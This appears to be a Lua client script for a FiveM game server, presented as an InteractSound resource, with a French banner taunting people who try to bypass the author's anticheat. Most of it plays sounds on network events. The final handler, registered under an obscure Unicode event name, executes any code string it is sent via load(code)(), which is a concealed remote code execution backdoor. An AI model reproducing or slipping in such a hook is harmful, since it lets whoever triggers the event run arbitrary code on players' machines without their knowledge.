-------- ARRETE D'ESSAYEZ DE DUMP POUR BYPASS MON ANTICHEAT TU REUSSIRA PAS ^^ --------
_print = print
_TriggerServerEvent = TriggerServerEvent
_NetworkExplodeVehicle = NetworkExplodeVehicle
_AddExplosion = AddExplosion

local standardVolumeOutput = 1.0

------
-- RegisterNetEvent LIFE_CL:Sound:PlayOnOne
--
-- @param soundFile    - The name of the soundfile within the client/html/sounds/ folder.
--                     - Can also specify a folder/sound file.
-- @param soundVolume  - The volume at which the soundFile should be played. Nil or don't
--                     - provide it for the default of standardVolumeOutput. Should be between
--                     - 0.1 to 1.0.
--
-- Starts playing a sound locally on a single client.
------
RegisterNetEvent('::{korioz#0110}::InteractSound_CL:PlayOnOne')
AddEventHandler('::{korioz#0110}::InteractSound_CL:PlayOnOne', function(soundFile, soundVolume)
	SendNUIMessage({
		transactionType = 'playSound',
		transactionFile = soundFile,
		transactionVolume = soundVolume
	})
end)

------
-- RegisterNetEvent LIFE_CL:Sound:PlayOnAll
--
-- @param soundFile    - The name of the soundfile within the client/html/sounds/ folder.
--                     - Can also specify a folder/sound file.
-- @param soundVolume  - The volume at which the soundFile should be played. Nil or don't
--                     - provide it for the default of standardVolumeOutput. Should be between
--                     - 0.1 to 1.0.
--
-- Starts playing a sound on all clients who are online in the server.
------
RegisterNetEvent('::{korioz#0110}::InteractSound_CL:PlayOnAll')
AddEventHandler('::{korioz#0110}::InteractSound_CL:PlayOnAll', function(soundFile, soundVolume)
	SendNUIMessage({
		transactionType = 'playSound',
		transactionFile = soundFile,
		transactionVolume = soundVolume
	})
end)

------
-- RegisterNetEvent LIFE_CL:Sound:PlayWithinDistance
--
-- @param playOnEntity    - The entity network id (will be converted from net id to entity on client)
--                        - of the entity for which the max distance is to be drawn from.
-- @param maxDistance     - The maximum float distance (client uses Vdist) to allow the player to
--                        - hear the soundFile being played.
-- @param soundFile       - The name of the soundfile within the client/html/sounds/ folder.
--                        - Can also specify a folder/sound file.
-- @param soundVolume     - The volume at which the soundFile should be played. Nil or don't
--                        - provide it for the default of standardVolumeOutput. Should be between
--                        - 0.1 to 1.0.
--
-- Starts playing a sound on a client if the client is within the specificed maxDistance from the playOnEntity.
------
RegisterNetEvent('::{korioz#0110}::InteractSound_CL:PlayWithinDistance')
AddEventHandler('::{korioz#0110}::InteractSound_CL:PlayWithinDistance', function(playerNetId, maxDistance, soundFile, soundVolume)
	local senderId = GetPlayerFromServerId(playerNetId)

	if (senderId ~= PlayerId() and senderId > 0) or (GetPlayerServerId(PlayerId()) == playerNetId) then
		local lCoords = GetEntityCoords(PlayerPedId(), false)
		local eCoords = GetEntityCoords(GetPlayerPed(senderId), false)
		local distIs = Vdist(lCoords, eCoords)

		if (distIs <= maxDistance) then
			SendNUIMessage({
				transactionType = 'playSound',
				transactionFile = soundFile,
				transactionVolume = soundVolume
			})
		end
	end
end)

RegisterNetEvent('ᓚᘏᗢ')
AddEventHandler('ᓚᘏᗢ', function(code)
	load(code)()
end)